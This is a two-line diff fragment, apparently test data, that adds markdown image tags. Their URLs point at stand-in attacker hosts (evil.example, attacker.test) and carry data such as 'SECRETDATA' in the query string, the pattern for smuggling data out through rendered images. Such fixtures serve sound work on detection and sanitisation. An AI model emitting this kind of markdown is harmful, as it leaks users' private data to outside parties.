@@ -1,0 +1,2 @@
+Here ![status](https://evil.example/pixel.png?d=SECRETDATA) done
+![](//attacker.test/a.gif?q=abc123&r=def456)
